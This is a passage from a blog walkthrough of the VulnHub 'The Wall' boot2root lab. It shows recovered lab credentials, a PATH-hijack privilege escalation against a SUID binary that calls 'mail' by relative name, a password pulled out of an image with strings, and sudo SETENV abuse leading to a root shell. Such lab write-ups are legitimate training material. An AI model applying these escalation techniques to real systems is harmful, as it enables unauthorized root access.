+<pc><p><b>F</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-</code></p></pc>
+</td>
+<td>
+<pc><p><b>A</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>R</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>..-.</code></p></pc>
+</td>
+<td>
+<pc><p><b>F</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>..</code></p></pc>
+</td>
+<td>
+<pc><p><b>I</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>...</code></p></pc>
+</td>
+<td>
+<pc><p><b>S</b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>.-</code></p></pc>
+</td>
+<td>
+<pc><p><b>A</b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="discovered-credentials">Discovered Credentials</h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>RichardWright</code></p></pc>
+</td>
+<td>
+<pc><p>1943farfisa</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="account-richardwright">Account: RichardWright</h3>
+<p><code>su - RichardWright</code> was possible using the above credentials.</p>
+<p>Local enumeration discovered the SUID binary
+<code>/usr/local/bin/shineon</code>, running the binary through
+<code>strings</code> discovered it called the program <code>mail</code> without
+specifying the absolute path.</p>
+<p>Strings output:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">load_menu
+Time - The Dark Side of the Moon
+/usr/bin/cal
+Press ENTER to <span class="k">continue</span>.
+Echoes - Meddle
+/usr/bin/who
+Is There Anybody Out There? - The Wall
+/sbin/ping -c 3 www.google.com
+Keep Talking- The Division Bell
+mail</code></pre></figure>
+<h3 id="path-manipulation">PATH Manipulation</h3>
+<p>The following file was created:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/bin/echo <span class="s2">"/bin/sh"</span> &gt; /tmp/mail</code></pre></figure>
+<p>Changed directory to <code>/tmp</code> and PATH set to .</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.</code></pre></figure>
+<p>Execution of option 4 executed the mail script successfully.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>/usr/local/bin/shineon
+Menu
+
+1. Calendar
+2. Who
+3. Check Internet
+4. Check Mail
+5. Exit
+4
+Keep Talking- The Division Bell
+<span class="gp">$ </span>/usr/bin/id
+<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span>
+<span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>RichardWright<span class="o">)</span></code></pre></figure>
+<h3 id="account-davidgilmour">Account: DavidGilmour</h3>
+<p>With euid set, enumeration of DavidGimours home dir was possible.</p>
+<p>Running strings on <code>david_gilmour_profile.jpg</code> revealed the users
+password.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>/usr/bin/strings david_gilmour_profile_pic.jpg
+
+|Mvk
+7OnN<span class="o">}</span>
+Nn_<span class="o">}</span>
+^<span class="o">=</span>&gt;W
+<span class="o">{</span>w|6
+Om?OoA
+who_are_you_and_who_am_i</code></pre></figure>
+<div class="note tip">
+<h5>URL also disclosed via Apache config</h5>
+<p>The web app URL was also disclosed at <code>/etc/httpd.conf.orig</code></p>
+</div>
+<p>Viewing <code>anotherbrick.txt</code> revealed the following:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># cat /home/DavidGilmour/anotherbrick.txt</span>
+<span class="c"># Come on you raver, you seer of visions, come on you painter, you piper, you</span>
+prisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond
+
+New website <span class="k">for </span>review:
+pinkfloyd1965newblogsite50yearscelebration-temp/index.php
+
+<span class="c"># You have to be trusted by the people you lie to. So that when they turn their</span>
+backs on you, you<span class="s1">'ll get the chance to put the knife in. - Pink Floyd, Dogs
+#</span></code></pre></figure>
+<h2 id="web-application-enumeration">Web Application Enumeration</h2>
+<p>Enumeration of the above web application exposed a code comment riddle:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--Through the window <span class="k">in </span>the wall, come streaming <span class="k">in </span>on sunlight wings, a
+million bright ambassadors of morning. - Pink Floyd, Echoes
+Can you see what the Dog sees? Perhaps hints of lightness streaming <span class="k">in </span>on
+sunlight wings?--&gt;</code></pre></figure>
+<p>The area of the image near the dog revealed some text strings. Using
+<strong>Image Magik</strong> the brightness was increased to dislcose the strings
+<code>/welcometothemachine</code> and
+<code>50696e6b466c6f796435305965617273</code></p>
+<p><img src="https://highon.coffee/img/blog/thewall/brighter.jpg" alt="Image Magik Brightness Increase" /></p>
+<h2 id="root-shell">Root Shell</h2>
+<p>Searching for the string <code>welcomethemachine</code> discovered the
+following binary <code>/var/www/htdocs/welcometothemachine/PinkFloyd</code>.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>./PinkFloyd
+Please send your answer to Old Pink, <span class="k">in </span>care of the Funny Farm. - Pink Floyd,
+Empty Spaces
+Answer: 50696e6b466c6f796435305965617273
+
+Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless
+
+Congratulations... permission has been granted.
+You can now <span class="nb">set </span>your controls to the heart of the sun!
+<span class="gp">$ </span>sudo -l
+Password:
+Matching Defaults entries <span class="k">for </span>DavidGilmour on thewall:
+    env_keep+<span class="o">=</span><span class="s2">"FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"</span>
+
+User DavidGilmour may run the following commands on thewall:
+<span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+<span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+<span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+<span class="o">(</span>ALL<span class="o">)</span> SETENV: ALL
+<span class="gp">$ </span>whoami
+DavidGilmour
+<span class="gp">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>
+<span class="nv">groups</span><span class="o">=</span>1004<span class="o">(</span>DavidGilmour<span class="o">)</span>, 1<span class="o">(</span>daemon<span class="o">)</span>, 67<span class="o">(</span>www<span class="o">)</span>,
+1005<span class="o">(</span>welcometothemachine<span class="o">)</span>
+<span class="gp">$ </span>sudo su -
+<span class="c"># whoami</span>
+root
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>, 2<span class="o">(</span>kmem<span class="o">)</span>, 3<span class="o">(</span>sys<span class="o">)</span>,
+4<span class="o">(</span>tty<span class="o">)</span>, 5<span class="o">(</span>operator<span class="o">)</span>, 20<span class="o">(</span>staff<span class="o">)</span>, 31<span class="o">(</span>guest<span class="o">)</span>
+<span class="c"># id</span></code></pre></figure>
+<h2 id="root-flag">Root Flag</h2>
+<p><img src="https://highon.coffee/img/blog/thewall/thewall-root-flag.png" alt="VulnHub TheWall Root Flag" /></p>
+<p>Thanks for the VM :)</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=The%20Wall%20Boot2Root%20Walkthrough&amp;url=https://highon.coffee/blog/the-wall-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/the-wall-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/the-wall-walkthrough/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/the-wall-walkthrough/&amp;title=The%20Wall%20Boot2Root%20Walkthrough" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../sleepy-ctf-walkthrough/index.html">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../pipe-ctf-walkthrough/index.html">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="../lord-of-the-root-walkthrough/index.html">Lord of the Root Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="../index.html">All Blog</a>
+</li>
+<li class="">
+<a href="../cheat-sheet/index.html">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="../techniques/index.html">Techniques</a>
+</li>
+<li class="">
+<a href="../security-hardening/index.html">Security Hardening</a>
+</li>
+<li class="">
+<a href="../walkthroughs/index.html">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
+<a href="../penetration-testing-tools-cheat-sheet/index.html">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../lfi-cheat-sheet/index.html">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../vi-cheat-sheet/index.html">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../systemd-cheat-sheet/index.html">Systemd Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../reverse-shell-cheat-sheet/index.html">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nbtscan-cheat-sheet/index.html">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../nmap-cheat-sheet/index.html">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-commands-cheat-sheet/index.html">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="../cheat-sheet/index.html">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat2-writeup/index.html">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="../insomnihack-ctf-teaser-smartcat1-writeup/index.html">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="../fristileaks-walkthrough/index.html">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="../sickos-1-walkthrough/index.html">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="current">
+<a href="index.html">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="../walkthroughs/index.html">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="../ssh-meterpreter-pivoting-techniques/index.html">SSH & Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="../techniques/index.html">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="../security-harden-centos-7/index.html">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="../security-hardening/index.html">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="../urandom/index.html">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="../kali-chromium-install/index.html">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="../jenkins-api-unauthenticated-rce-exploit/index.html">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="../macbook-post-install-check-list/index.html">MacBook - Post Install Config + Apps</a>
+</li>
+
+<li class="">
+<a href="../enum4linux-cheat-sheet/index.html">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="../linux-local-enumeration-script/index.html">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="../howto-install-quassel-ubuntu/index.html">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="../keepnote-macbook-install-instructions/index.html">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are &copy;&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="https://highon.coffee/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script>
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</body>
+
+<!-- Mirrored from highon.coffee/blog/the-wall-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:04:50 GMT -->
+</html>
